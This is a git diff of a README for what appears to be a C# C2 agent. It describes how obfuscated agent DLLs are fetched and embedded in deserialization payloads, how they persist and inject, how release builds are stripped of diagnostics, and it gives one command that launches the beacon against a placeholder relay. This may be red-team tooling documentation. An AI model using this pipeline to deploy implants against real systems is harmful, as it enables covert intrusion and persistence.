@@ -102,12 +102,13 @@ testing of the deserialization chain.
 CI builds **one image per (arch × CLR side)** and publishes the binaries — the C2 consumes
 the **binaries**, not the source: its Agents-table **CSharp-Agent** rows (one per arch ×
 framework tag) point at the rolling prerelease assets
-`releases/download/preview/csharp-agent-<net2|net4>-<i386|x86_64|aarch64>.dll`, fetched via
+`releases/download/release/csharp-agent-<net2|net4>-<i386|x86_64|aarch64>.dll`, fetched via
 the relay `/proxy` or directly, parsed with dnlib (entry detection + identifier
 obfuscation) and embedded into the deserialization blob. The UpgradeNetFramework window picks the row
 by the gadget's framework tag + the target's process arch; the Persistence Manager takes
-the CLR-4 side for its arch. Every push to `main` recreates the `preview` prerelease
-(`build.yml`); pushing a `v*` tag publishes a stable release (`release.yml`).
+the CLR-4 side for its arch. Every push to `main` recreates the rolling prereleases
+(`build.yml`): **`release`** carries the plain assets, **`debug`** the `-debug` siblings;
+pushing a `v*` tag publishes a stable release (`release.yml`).
 
 Each side × arch also ships a **self-running `.exe` sibling**
 (`csharp-agent-<net2|net4>-<i386|x86_64|aarch64>.exe`): the same image compiled with
@@ -116,16 +117,17 @@ guarded `Main` — run it directly with `H_URL`/`A_URL` in the environment (e.g.
 `set H_URL=https://<relay>/ && csharp-agent-net2-i386.exe`) to isolate the beacon/transport
 from the delivery chain. The panel never fetches these; its rows name the `.dll` assets.
 
-**Debug vs release:** the rolling `preview` release ships BOTH flavors per side × arch.
-The plain assets (`csharp-agent-<side>-<arch>.{dll,exe}` — the names the C2 panel fetches)
-have **no diagnostics compiled in at all**: every `Diag.*` call site is wrapped in
-`#if DEBUG`, so a release binary carries no diag strings, no user32 bind, nothing to
-strip. The `-debug` assets (`csharp-agent-<side>-<arch>-debug.{dll,exe}`) pop a blocking
-MessageBox on every decision/exit path — the LAST caption that appeared marks how far the
-agent got; the step AFTER it is the one that died or quit. Vocabulary: `[1]–[9]` beacon
-lifecycle, `[exit] …` fatal branches, `[cmd] 0x…` delivered commands, `[inj n]` inject
-steps (`[inj 8] entry` = the last caption before a native payload crash). Ship `-debug`
-only to a box you are debugging by hand — the popups are operator-visible by design.
+**Debug vs release:** the plain assets (`csharp-agent-<side>-<arch>.{dll,exe}` — the names
+the C2 panel fetches, riding the rolling **`release`** prerelease) have **no diagnostics
+compiled in at all**: every `Diag.*` call site is wrapped in `#if DEBUG`, so a release
+binary carries no diag strings, no user32 bind, nothing to strip. The `-debug` assets
+(`csharp-agent-<side>-<arch>-debug.{dll,exe}`, on the rolling **`debug`** prerelease) pop
+a blocking MessageBox on every decision/exit path — the LAST caption that appeared marks
+how far the agent got; the step AFTER it is the one that died or quit. Vocabulary:
+`[1]–[9]` beacon lifecycle, `[exit] …` fatal branches, `[cmd] 0x…` delivered commands,
+`[inj n]` inject steps (`[inj 8] entry` = the last caption before a native payload
+crash). Ship `-debug` only to a box you are debugging by hand — the popups are
+operator-visible by design.
 
 ## License
 
